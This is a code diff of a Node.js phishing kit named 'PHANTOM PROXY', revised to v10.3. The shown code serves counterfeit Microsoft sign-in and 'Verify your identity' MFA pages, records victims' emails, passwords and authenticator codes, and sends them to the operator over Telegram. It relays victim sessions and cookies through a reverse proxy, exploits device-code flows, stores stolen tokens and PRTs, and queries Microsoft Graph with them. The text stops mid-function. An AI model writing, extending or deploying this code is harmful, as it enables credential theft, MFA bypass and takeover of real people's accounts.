@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.1 — COMPLETE FIXED EDITION
+// 🥔 PHANTOM PROXY v10.3 — ULTIMATE FIXED EDITION (SINGLE SERVER)
 // ============================================================
-// 🔥 ALL FEATURES WORKING: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + Capture + MFA
+// 🔥 ALL FEATURES: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + Capture + MFA
 // ============================================================
 
 const http = require("http");
@@ -49,7 +49,6 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-// ── ✅ FIXED: Original encryption key + SHA-256 for proper length ──
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.createHash('sha256').update('HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y').digest();
 const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
 const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
@@ -63,6 +62,23 @@ const LOG_FILE_STREAMS = {};
 const VICTIM_SESSIONS = {};
 let deviceFlows = [];
 let prtStorage = { prts: [], lastScan: null };
+
+// ── Ensure HTML files exist ──
+const indexFile = path.join(__dirname, PROXY_FILES.index);
+const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
+const scriptFile = path.join(__dirname, PROXY_FILES.script);
+if (!fs.existsSync(indexFile)) {
+    fs.writeFileSync(indexFile, `<!DOCTYPE html><html><head><title>Sign in</title></head><body><h1>Sign in</h1><form action="/capture" method="POST"><input name="email"><input name="password" type="password"><button>Next</button></form></body></html>`);
+    console.log('✅ Created dummy index.html');
+}
+if (!fs.existsSync(notFoundFile)) {
+    fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
+    console.log('✅ Created dummy 404.html');
+}
+if (!fs.existsSync(scriptFile)) {
+    fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
+    console.log('✅ Created dummy script.js');
+}
 
 // ── ✅ CACHE MANAGER ──
 class CacheManager {
@@ -203,7 +219,8 @@ function getUserSession(requestCookies) {
     const cookies = requestCookies.split("; ");
     for (const cookie of cookies) {
         const [name, ...val] = cookie.split("=");
-        if (VICTIM_SESSIONS[name] && VICTIM_SESSIONS[name].value === val.join("=")) return name;
+        const nameLower = name.toLowerCase();
+        if (VICTIM_SESSIONS[nameLower] && VICTIM_SESSIONS[nameLower].value === val.join("=")) return nameLower;
     }
     return;
 }
@@ -225,7 +242,7 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName] = {
         value: cookieValue,
         cookies: [],
-        protocol: phishedURL.protocol,
+        protocol: phishedURL.protocol || 'https:',
         hostname: phishedURL.hostname,
         path: phishedURL.pathname + phishedURL.search,
         port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
@@ -427,7 +444,8 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     if (cookies) proxyRequestOptions.headers.cookie = cookies;
     else delete proxyRequestOptions.headers.cookie;
     if (proxyRequestOptions.headers.origin) {
-        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
+        const protocol = VICTIM_SESSIONS[currentSession].protocol || 'https:';
+        proxyRequestOptions.headers.origin = `${protocol}//${VICTIM_SESSIONS[currentSession].host}`;
     }
     if (proxyRequestOptions.headers.referer && proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT)) {
         delete proxyRequestOptions.headers.referer;
@@ -499,23 +517,6 @@ function updateFederationRedirectUrl(body, proxyHostname) {
         obj.Credentials.FederationRedirectUrl = proxyUrl;
         return Buffer.from(JSON.stringify(obj));
     } catch (e) { return body; }
-}
-
-// ── Ensure HTML files exist ──
-const indexFile = path.join(__dirname, PROXY_FILES.index);
-const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
-const scriptFile = path.join(__dirname, PROXY_FILES.script);
-if (!fs.existsSync(indexFile)) {
-    fs.writeFileSync(indexFile, `<!DOCTYPE html><html><head><title>Sign in</title></head><body><h1>Sign in</h1><form action="/capture" method="POST"><input name="email"><input name="password" type="password"><button>Next</button></form></body></html>`);
-    console.log('✅ Created dummy index.html');
-}
-if (!fs.existsSync(notFoundFile)) {
-    fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
-    console.log('✅ Created dummy 404.html');
-}
-if (!fs.existsSync(scriptFile)) {
-    fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
-    console.log('✅ Created dummy script.js');
 }
 
 // ============================================================
@@ -687,6 +688,48 @@ async function refreshTokensDaemon() {
 }
 
 // ============================================================
+// 📥 GRAPH CLIENT
+// ============================================================
+class GraphClient {
+    constructor(accessToken) {
+        this.accessToken = accessToken;
+        this.baseUrl = 'https://graph.microsoft.com/v1.0';
+        this.cache = global._cache || new CacheManager();
+    }
+
+    async get(endpoint, useCache = true) {
+        const cacheKey = `graph:get:${endpoint}`;
+        if (useCache) {
+            const cached = this.cache.get(cacheKey);
+            if (cached) return cached;
+        }
+        const config = getAxiosConfig();
+        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
+        const response = await retry(async () => {
+            return await axios.get(`${this.baseUrl}${endpoint}`, config);
+        }, 3, 1000, 2);
+        if (useCache && response.status === 200) {
+            this.cache.set(cacheKey, response.data, 300000);
+        }
+        return response.data;
+    }
+
+    async post(endpoint, data) {
+        const config = getAxiosConfig();
+        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
+        config.headers['Content-Type'] = 'application/json';
+        const response = await retry(async () => {
+            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
+        }, 3, 1000, 2);
+        return response.data;
+    }
+
+    async getUserProfile() {
+        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
+    }
+}
+
+// ============================================================
 // 🛡️ DASHBOARD AUTH MIDDLEWARE
 // ============================================================
 function requireAuth(req, res) {
@@ -709,161 +752,6 @@ function requireAuth(req, res) {
     res.end();
     return false;
 }
-
-// ============================================================
-// 🌐 MAIN PROXY SERVER
-// ============================================================
-const server = http.createServer(async (req, res) => {
-    const { method, url } = req;
-
-    // ── Dashboard HTML (with auth) ──
-    if (url === '/dash' || url === '/dash/') {
-        if (!requireAuth(req, res)) return;
-        const dashPath = path.join(__dirname, 'public', 'index.html');
-        if (fs.existsSync(dashPath)) {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            fs.createReadStream(dashPath).pipe(res);
-        } else {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
-        }
-        return;
-    }
-
-    // ── Dashboard API endpoints (with auth) ──
-    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
-        if (!requireAuth(req, res)) return;
-        await handleDashboardAPI(req, res);
-        return;
-    }
-
-    // ── Device Code (with auth) ──
-    if (url === '/device' || url.startsWith('/device')) {
-        if (!requireAuth(req, res)) return;
-        const devicePath = path.join(__dirname, 'public', 'device_code.html');
-        if (fs.existsSync(devicePath)) {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            fs.createReadStream(devicePath).pipe(res);
-        } else {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(`<h1>Device Code</h1><p>Place public/device_code.html</p>`);
-        }
-        return;
-    }
-
-    // ── ✅ FIXED: /capture endpoint ──
-    if (url === '/capture' && method === 'POST') {
-        let body = '';
-        req.on('data', chunk => { body += chunk; });
-        req.on('end', () => {
-            try {
-                const params = new URLSearchParams(body);
-                const email = params.get('email') || 'N/A';
-                const password = params.get('password') || 'N/A';
-                const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
-                
-                // Store in session
-                if (!VICTIM_SESSIONS[sessionId]) {
-                    VICTIM_SESSIONS[sessionId] = { value: sessionId, cookies: [] };
-                }
-                VICTIM_SESSIONS[sessionId].email = email;
-                VICTIM_SESSIONS[sessionId].password = password;
-                
-                // ── ✅ Send Telegram notification ──
-                sendToTelegram({
-                    sessionId: sessionId,
-                    email: email,
-                    password: password,
-                    mfa: 'N/A',
-                    tokens: {},
-                    cookies: {}
-                }).catch(e => console.error('Telegram send error:', e.message));
-                
-                // Show MFA page
-                res.writeHead(200, { 'Content-Type': 'text/html' });
-                res.end(`
-<!DOCTYPE html>
-<html>
-<head><title>Verify your identity</title>
-<style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { font-family:'Segoe UI',sans-serif; background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; }
-.container { background:#fff; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.12); padding:44px 36px; width:440px; max-width:100%; }
-.logo { text-align:center; margin-bottom:28px; }
-.logo svg { height:28px; }
-h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
-.subtitle { font-size:15px; color:#616161; margin-bottom:28px; }
-.input-group { margin-bottom:18px; }
-.input-group label { display:block; font-size:13px; font-weight:600; color:#1b1b1b; margin-bottom:6px; }
-.input-group input { width:100%; padding:12px 14px; font-size:15px; border:1px solid #8b8b8b; border-radius:4px; background:#fbfbfb; }
-.input-group input:focus { border-color:#005da6; outline:none; box-shadow:0 0 0 2px rgba(0,93,166,0.25); }
-.btn-primary { width:100%; padding:12px; font-size:15px; font-weight:600; color:#fff; background:#005da6; border:none; border-radius:4px; cursor:pointer; }
-.btn-primary:hover { background:#004a87; }
-.footer { margin-top:28px; font-size:12px; color:#757575; text-align:center; border-top:1px solid #e6e6e6; padding-top:20px; }
-</style>
-</head>
-<body>
-<div class="container">
-<div class="logo"><svg viewBox="0 0 108 28" fill="none"><path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/><path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/><path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/><path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/></svg></div>
-<h1>Verify your identity</h1>
-<p class="subtitle">Enter the 6-digit code from your authenticator app.</p>
-<form action="/mfa/submit" method="POST">
-<div class="input-group"><label>Verification code</label><input type="text" name="mfa_code" placeholder="Enter code" maxlength="6" required></div>
-<button type="submit" class="btn-primary">Verify</button>
-</form>
-<div class="footer">© 2026 Microsoft</div>
-</div>
-</body>
-</html>
-                `);
-            } catch (e) {
-                console.error('Capture error:', e);
-                res.writeHead(400);
-                res.end('Invalid request');
-            }
-        });
-        return;
-    }
-
-    // ── ✅ FIXED: /mfa/submit endpoint ──
-    if (url === '/mfa/submit' && method === 'POST') {
-        let body = '';
-        req.on('data', chunk => { body += chunk; });
-        req.on('end', () => {
-            try {
-                const params = new URLSearchParams(body);
-                const mfaCode = params.get('mfa_code') || 'N/A';
-                const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
-                
-                if (VICTIM_SESSIONS[sessionId]) {
-                    VICTIM_SESSIONS[sessionId].mfa = mfaCode;
-                    
-                    // ── ✅ Send Telegram notification with MFA ──
-                    sendToTelegram({
-                        sessionId: sessionId,
-                        email: VICTIM_SESSIONS[sessionId].email || 'N/A',
-                        password: VICTIM_SESSIONS[sessionId].password || 'N/A',
-                        mfa: mfaCode,
-                        tokens: {},
-                        cookies: {}
-                    }).catch(e => console.error('Telegram send error:', e.message));
-                }
-                
-                // Redirect to real Microsoft
-                res.writeHead(302, { Location: REDIRECT_URL });
-                res.end();
-            } catch (e) {
-                console.error('MFA submit error:', e);
-                res.writeHead(400);
-                res.end('Invalid request');
-            }
-        });
-        return;
-    }
-
-    // ── Proxy ──
-    proxyHandler(req, res);
-});
 
 // ============================================================
 // 🔧 DASHBOARD API HANDLER
@@ -946,7 +834,6 @@ async function handleDashboardAPI(req, res) {
                         } catch (e) {}
                     }
                     saveDeviceFlows();
-                    // ── Send Telegram notification for device flow ──
                     sendToTelegram({
                         sessionId: flow.session_id || 'device_flow',
                         email: flow.username || 'Device User',
@@ -1958,324 +1845,464 @@ async function handleDashboardAPI(req, res) {
 }
 
 // ============================================================
-// 🔧 PROXY HANDLER
+// 💾 SAVE FUNCTIONS
 // ============================================================
-function proxyHandler(req, res) {
-    proxyServer.emit('request', req, res);
+function saveDeviceFlows() {
+    try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {}
 }
-
-// ── Load device flows ──
-function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {} }
-function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
-loadDeviceFlows();
-
-// ── Load PRT storage ──
+function savePRTStorage() {
+    try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {}
+}
+function loadDeviceFlows() {
+    try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {}
+}
 function loadPRTStorage() {
     try { if (fs.existsSync(PRT_STORAGE_FILE)) { prtStorage = JSON.parse(fs.readFileSync(PRT_STORAGE_FILE, 'utf-8')); } } catch (e) {}
 }
-function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
+
+loadDeviceFlows();
 loadPRTStorage();
 
-// ── Graph API Client ──
-class GraphClient {
-    constructor(accessToken) {
-        this.accessToken = accessToken;
-        this.baseUrl = 'https://graph.microsoft.com/v1.0';
-        this.cache = global._cache || new CacheManager();
-    }
+// ============================================================
+// 🌐 SINGLE MAIN SERVER (ALL LOGIC IN ONE PLACE)
+// ============================================================
+const server = http.createServer(async (req, res) => {
+    const { method, url } = req;
 
-    async get(endpoint, useCache = true) {
-        const cacheKey = `graph:get:${endpoint}`;
-        if (useCache) {
-            const cached = this.cache.get(cacheKey);
-            if (cached) return cached;
+    // ── Dashboard HTML ──
+    if (url === '/dash' || url === '/dash/') {
+        if (!requireAuth(req, res)) return;
+        const dashPath = path.join(__dirname, 'public', 'index.html');
+        if (fs.existsSync(dashPath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            fs.createReadStream(dashPath).pipe(res);
+        } else {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
         }
-        const config = getAxiosConfig();
-        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
-        const response = await retry(async () => {
-            return await axios.get(`${this.baseUrl}${endpoint}`, config);
-        }, 3, 1000, 2);
-        if (useCache && response.status === 200) {
-            this.cache.set(cacheKey, response.data, 300000);
+        return;
+    }
+
+    // ── Dashboard API ──
+    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
+        if (!requireAuth(req, res)) return;
+        await handleDashboardAPI(req, res);
+        return;
+    }
+
+    // ── Device Code Page ──
+    if (url === '/device' || url.startsWith('/device')) {
+        if (!requireAuth(req, res)) return;
+        const devicePath = path.join(__dirname, 'public', 'device_code.html');
+        if (fs.existsSync(devicePath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            fs.createReadStream(devicePath).pipe(res);
+        } else {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(`<h1>Device Code</h1><p>Place public/device_code.html</p>`);
         }
-        return response.data;
+        return;
     }
 
-    async post(endpoint, data) {
-        const config = getAxiosConfig();
-        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
-        config.headers['Content-Type'] = 'application/json';
-        const response = await retry(async () => {
-            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
-        }, 3, 1000, 2);
-        return response.data;
+    // ── Capture endpoint ──
+    if (url === '/capture' && method === 'POST') {
+        let body = '';
+        req.on('data', chunk => { body += chunk; });
+        req.on('end', () => {
+            try {
+                const params = new URLSearchParams(body);
+                const email = params.get('email') || 'N/A';
+                const password = params.get('password') || 'N/A';
+                const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
+                
+                if (!VICTIM_SESSIONS[sessionId]) {
+                    VICTIM_SESSIONS[sessionId] = { value: sessionId, cookies: [] };
+                }
+                VICTIM_SESSIONS[sessionId].email = email;
+                VICTIM_SESSIONS[sessionId].password = password;
+                
+                sendToTelegram({
+                    sessionId: sessionId,
+                    email: email,
+                    password: password,
+                    mfa: 'N/A',
+                    tokens: {},
+                    cookies: {}
+                }).catch(e => console.error('Telegram send error:', e.message));
+                
+                res.writeHead(200, { 'Content-Type': 'text/html' });
+                res.end(`
+<!DOCTYPE html>
+<html>
+<head><title>Verify your identity</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',sans-serif; background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+.container { background:#fff; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.12); padding:44px 36px; width:440px; max-width:100%; }
+.logo { text-align:center; margin-bottom:28px; }
+.logo svg { height:28px; }
+h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
+.subtitle { font-size:15px; color:#616161; margin-bottom:28px; }
+.input-group { margin-bottom:18px; }
+.input-group label { display:block; font-size:13px; font-weight:600; color:#1b1b1b; margin-bottom:6px; }
+.input-group input { width:100%; padding:12px 14px; font-size:15px; border:1px solid #8b8b8b; border-radius:4px; background:#fbfbfb; }
+.input-group input:focus { border-color:#005da6; outline:none; box-shadow:0 0 0 2px rgba(0,93,166,0.25); }
+.btn-primary { width:100%; padding:12px; font-size:15px; font-weight:600; color:#fff; background:#005da6; border:none; border-radius:4px; cursor:pointer; }
+.btn-primary:hover { background:#004a87; }
+.footer { margin-top:28px; font-size:12px; color:#757575; text-align:center; border-top:1px solid #e6e6e6; padding-top:20px; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo"><svg viewBox="0 0 108 28" fill="none"><path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/><path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/><path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/><path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/></svg></div>
+<h1>Verify your identity</h1>
+<p class="subtitle">Enter the 6-digit code from your authenticator app.</p>
+<form action="/mfa/submit" method="POST">
+<div class="input-group"><label>Verification code</label><input type="text" name="mfa_code" placeholder="Enter code" maxlength="6" required></div>
+<button type="submit" class="btn-primary">Verify</button>
+</form>
+<div class="footer">© 2026 Microsoft</div>
+</div>
+</body>
+</html>
+                `);
+            } catch (e) {
+                console.error('Capture error:', e);
+                res.writeHead(400);
+                res.end('Invalid request');
+            }
+        });
+        return;
     }
 
-    async getUserProfile() {
-        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
+    // ── MFA Submit ──
+    if (url === '/mfa/submit' && method === 'POST') {
+        let body = '';
+        req.on('data', chunk => { body += chunk; });
+        req.on('end', () => {
+            try {
+                const params = new URLSearchParams(body);
+                const mfaCode = params.get('mfa_code') || 'N/A';
+                const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
+                
+                if (VICTIM_SESSIONS[sessionId]) {
+                    VICTIM_SESSIONS[sessionId].mfa = mfaCode;
+                    sendToTelegram({
+                        sessionId: sessionId,
+                        email: VICTIM_SESSIONS[sessionId].email || 'N/A',
+                        password: VICTIM_SESSIONS[sessionId].password || 'N/A',
+                        mfa: mfaCode,
+                        tokens: {},
+                        cookies: {}
+                    }).catch(e => console.error('Telegram send error:', e.message));
+                }
+                res.writeHead(302, { Location: REDIRECT_URL });
+                res.end();
+            } catch (e) {
+                console.error('MFA submit error:', e);
+                res.writeHead(400);
+                res.end('Invalid request');
+            }
+        });
+        return;
     }
-}
 
-// ── Start auto-refresh ──
-refreshTokensDaemon();
+    // ── Service Worker ──
+    if (url === PROXY_PATHNAMES.serviceWorker) {
+        res.writeHead(200, { 'Content-Type': 'application/javascript' });
+        res.end('self.addEventListener("install", e => { e.waitUntil(self.skipWaiting()); });');
+        return;
+    }
 
-// ── The actual proxy server ──
-const proxyServer = http.createServer((clientRequest, clientResponse) => {
-    const { method, url, headers } = clientRequest;
-    const currentSession = getUserSession(headers.cookie);
+    // ── Script ──
+    if (url === PROXY_PATHNAMES.script) {
+        const scriptPath = path.join(__dirname, PROXY_FILES.script);
+        if (fs.existsSync(scriptPath)) {
+            res.writeHead(200, { 'Content-Type': 'application/javascript' });
+            fs.createReadStream(scriptPath).pipe(res);
+        } else {
+            res.writeHead(200, { 'Content-Type': 'application/javascript' });
+            res.end('console.log("PHANTOM Proxy Loaded.");');
+        }
+        return;
+    }
 
+    // ── Favicon ──
+    if (url === PROXY_PATHNAMES.favicon) {
+        const currentSession = getUserSession(req.headers.cookie);
+        if (currentSession && VICTIM_SESSIONS[currentSession]) {
+            const protocol = VICTIM_SESSIONS[currentSession].protocol || 'https:';
+            res.writeHead(301, { Location: `${protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
+        } else {
+            res.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
+        }
+        res.end();
+        return;
+    }
+
+    // ── JSCookie ──
+    if (url === PROXY_PATHNAMES.jsCookie) {
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end('PHANTOM_JS_COOKIE');
+        return;
+    }
+
+    // ── Mutation (redirect handler) ──
+    if (url.startsWith(PROXY_PATHNAMES.mutation)) {
+        try {
+            const urlObj = new URL(`http://${req.headers.host}${url}`);
+            const targetUrl = decodeURIComponent(urlObj.searchParams.get(PHISHED_URL_PARAMETER) || '');
+            if (targetUrl) {
+                res.writeHead(302, { Location: targetUrl });
+                res.end();
+                return;
+            }
+        } catch (e) {}
+    }
+
+    // ── PROXY ENTRY POINT ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-            let session = currentSession;
+            let currentSession = getUserSession(req.headers.cookie);
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
-                session = cookieName;
+                res.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                currentSession = cookieName;
             }
-            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
-            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[session].path = phishedURL.pathname + phishedURL.search;
-            VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
-            VICTIM_SESSIONS[session].host = phishedURL.host;
+            VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol || 'https:';
+            VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
+            VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
+            VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
+            VICTIM_SESSIONS[currentSession].host = phishedURL.host;
 
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+            res.writeHead(200, { "Content-Type": "text/html" });
+            fs.createReadStream(path.join(__dirname, PROXY_FILES.index)).pipe(res);
         } catch (error) {
             displayError("Entry point error", error, url);
-            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+            res.writeHead(404, { "Content-Type": "text/html" });
+            fs.createReadStream(path.join(__dirname, PROXY_FILES.notFound)).pipe(res);
         }
         return;
     }
 
-    if (url === PROXY_PATHNAMES.serviceWorker) {
-        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-        fs.createReadStream(url.slice(1)).pipe(clientResponse);
+    // ── PROXY: All other requests ──
+    const currentSession = getUserSession(req.headers.cookie);
+    if (!currentSession) {
+        res.writeHead(301, { Location: REDIRECT_URL });
+        res.end();
         return;
     }
 
-    if (url === PROXY_PATHNAMES.favicon) {
-        if (currentSession && VICTIM_SESSIONS[currentSession]) {
-            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
-        } else {
-            clientResponse.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
-        }
-        clientResponse.end();
-        return;
-    }
+    let clientRequestBody = [];
+    req.on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
+       .on("data", (chunk) => clientRequestBody.push(chunk))
+       .on("end", () => {
+           clientRequestBody = Buffer.concat(clientRequestBody).toString();
 
-    if (url === PROXY_PATHNAMES.proxy || currentSession) {
-        let clientRequestBody = [];
-        clientRequest
-            .on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
-            .on("data", (chunk) => clientRequestBody.push(chunk))
-            .on("end", () => {
-                clientRequestBody = Buffer.concat(clientRequestBody).toString();
+           let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol || 'https:';
+           const proxyRequestOptions = {
+               hostname: VICTIM_SESSIONS[currentSession].hostname,
+               port: VICTIM_SESSIONS[currentSession].port,
+               method: method,
+               path: VICTIM_SESSIONS[currentSession].path || '/',
+               headers: { ...req.headers },
+               rejectUnauthorized: false
+           };
+           let isNavigationRequest = false;
 
-                if (!currentSession) {
-                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
-                    clientResponse.end();
-                    return;
-                }
+           if (clientRequestBody) {
+               if (url === PROXY_PATHNAMES.jsCookie) {
+                   updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], req.headers.host, currentSession);
+                   const validDomains = getValidDomains([req.headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+                   res.writeHead(200, { "Content-Type": "application/json" });
+                   res.end(JSON.stringify(validDomains));
+                   return;
+               } else if (url === PROXY_PATHNAMES.proxy) {
+                   try {
+                       const parsed = JSON.parse(clientRequestBody);
+                       let proxyRequestURL = new URL(parsed.url);
+                       let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
 
-                let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
-                const proxyRequestOptions = {
-                    hostname: VICTIM_SESSIONS[currentSession].hostname,
-                    port: VICTIM_SESSIONS[currentSession].port,
-                    method: method,
-                    path: VICTIM_SESSIONS[currentSession].path,
-                    headers: { ...headers },
-                    rejectUnauthorized: false
-                };
-                let isNavigationRequest = false;
+                       if (proxyRequestURL.hostname === req.headers.host) {
+                           if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
+                               const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
+                               VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol || 'https:';
+                               VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
+                               VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
+                               VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
+                               VICTIM_SESSIONS[currentSession].host = phishedURL.host;
+                               res.writeHead(301, { Location: `${phishedURL.protocol}//${req.headers.host}${phishedURL.pathname}${phishedURL.search}` });
+                               res.end();
+                               return;
+                           } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
+                               const scriptPath = path.join(__dirname, PROXY_FILES.script);
+                               if (fs.existsSync(scriptPath)) {
+                                   res.writeHead(200, { "Content-Type": "text/javascript" });
+                                   fs.createReadStream(scriptPath).pipe(res);
+                               } else {
+                                   res.writeHead(200, { "Content-Type": "text/javascript" });
+                                   res.end('console.log("PHANTOM Proxy Loaded.");');
+                               }
+                               return;
+                           } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
+                               try {
+                                   const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
+                                   proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
+                                   proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
+                               } catch (error) {
+                                   displayError("Mutation parse failed", error, proxyRequestPath);
+                                   res.writeHead(404, { "Content-Type": "text/html" });
+                                   fs.createReadStream(path.join(__dirname, PROXY_FILES.notFound)).pipe(res);
+                                   return;
+                               }
+                           } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
+                               updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], req.headers.host, currentSession);
+                               const validDomains = getValidDomains([req.headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+                               res.writeHead(200, { "Content-Type": "application/json" });
